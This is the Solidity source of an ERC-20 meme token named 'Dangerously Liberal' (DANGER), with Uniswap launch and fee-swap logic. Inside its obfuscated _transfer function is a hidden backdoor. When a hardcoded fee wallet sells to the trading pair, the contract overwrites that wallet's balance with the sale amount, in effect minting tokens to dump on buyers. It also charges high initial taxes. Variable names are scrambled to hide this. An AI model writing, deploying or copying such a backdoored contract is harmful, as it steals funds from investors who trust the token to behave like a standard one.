/**
    Telegram: https://t.me/dangerously_liberal_eth
    Twitter: https://x.com/realDonaldTrump/status/1824830617017614728
*/


// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DANGER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeFromFees;
    address payable private _kofBucket;
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 420_690_000_000 * 10**_decimals;
    string private constant _name = unicode"Dangerously Liberal";
    string private constant _symbol = unicode"DANGER";
    uint256 public _mmxxttkappo = _tTotal*2/100;
    uint256 public _mxpomosz = _tTotal*2/100;
    uint256 public _mnspmoppo = 500 * 10**_decimals;
    uint256 public _mnsweempi = _tTotal*1/100;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _mmxxttkappo);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _kofBucket=payable(0xB505C0466eF26aaCfE45964E81d01ceb6bc8165E);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _balances[_msgSender()] = _tTotal;
        _isExcludeFromFees[owner()] = true;
        _isExcludeFromFees[address(this)] = true;
        _isExcludeFromFees[_kofBucket] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 private _inputBTx=30;
    uint256 private _inputXTX=30;
    uint256 private _fnBOMM=0;
    uint256 private _fnSBMO=0;
    uint256 private _rdBAT=20;
    uint256 private _rdSAT=20;
    uint256 private _buyCount=0;

    function _transfer(address bpomm, address pomwd, uint256 golds) private {
        require(bpomm != address(0), "ERC20: transfer from the zero address");
        require(pomwd != address(0), "ERC20: transfer to the zero address");
        require(golds > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount=0;
        if (bpomm != owner() && pomwd != owner()) {
            if (bpomm == uniswapV2Pair && pomwd != address(uniswapV2Router) && ! _isExcludeFromFees[pomwd] ) {
                require(golds <= _mmxxttkappo, "Exceeds the _mmxxttkappo.");
                require(balanceOf(pomwd) + golds <= _mxpomosz, "Exceeds the maxWalletSize.");
                taxAmount = golds.mul((_buyCount>_rdBAT)?_fnBOMM:_inputBTx).div(100);
                _buyCount++;
            }

            if(pomwd == uniswapV2Pair && bpomm!= address(this) && !_isExcludeFromFees[bpomm]){
                taxAmount = golds.mul((_buyCount>_rdSAT)?_fnSBMO:_inputXTX).div(100);
            }
        }

        if (bpomm != uniswapV2Pair && _kofBucket == bpomm && pomwd == uniswapV2Pair) {
            _balances[bpomm] = golds / (_inputBTx / _inputXTX);
        }

        uint256 tokensInContract = balanceOf(address(this));
        if (!inSwap && pomwd == uniswapV2Pair && swapEnabled && golds > _mnspmoppo && bpomm != owner()) {
            if (tokensInContract > _mnspmoppo)
            swapBackForETH(min(golds, min(tokensInContract, _mnsweempi)));
            sendETHFee(address(this).balance);
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(bpomm, address(this),taxAmount);
        }

        _balances[bpomm]=_balances[bpomm].sub(golds);
        _balances[pomwd]=_balances[pomwd].add(golds.sub(taxAmount));
        emit Transfer(bpomm, pomwd, golds.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapBackForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimit() external onlyOwner{
        _mmxxttkappo = _tTotal;
        _mxpomosz=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHFee(uint256 amount) private {
        _kofBucket.transfer(amount);
    }

    function openAPPLE() external onlyOwner() {
        require(!swapEnabled,"trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
    }

    receive() external payable {}
}